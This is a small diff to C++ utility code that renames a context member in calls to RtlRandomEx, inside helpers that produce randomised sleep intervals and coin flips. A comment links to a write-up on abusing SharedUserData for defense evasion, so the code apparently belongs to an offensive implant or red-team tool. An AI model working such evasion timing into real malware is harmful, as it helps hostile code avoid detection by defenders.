@@ -79,7 +79,7 @@ namespace Utils {
             // https://www.legacyy.xyz/defenseevasion/windows/2022/07/04/abusing-shareduserdata-for-defense-evasion-and-exploitation.html
 
             auto defaultseed = Utils::Random::RandomSeed();
-            auto seed = Ctx->Nt.RtlRandomEx(S_CAST(PULONG, &defaultseed));
+            auto seed = Ctx->nt.RtlRandomEx(S_CAST(PULONG, &defaultseed));
 
             volatile size_t x = INTERVAL(seed);
             const uintptr_t end = Utils::Random::Timestamp() + (x * ms);
@@ -171,8 +171,8 @@ namespace Utils {
 
             auto seed = RandomSeed();
 
-            seed = Ctx->Nt.RtlRandomEx(&seed);
-            seed = Ctx->Nt.RtlRandomEx(&seed);
+            seed = Ctx->nt.RtlRandomEx(&seed);
+            seed = Ctx->nt.RtlRandomEx(&seed);
             seed = seed % (LONG_MAX - 2 + 1) + 2;
 
             return seed % 2 == 0
@@ -186,7 +186,7 @@ namespace Utils {
             auto seed = RandomSeed();
 
             seed = RandomSeed();
-            seed = Ctx->Nt.RtlRandomEx(&seed);
+            seed = Ctx->nt.RtlRandomEx(&seed);
 
             return seed % 2 == 0 ? TRUE : FALSE;
         }
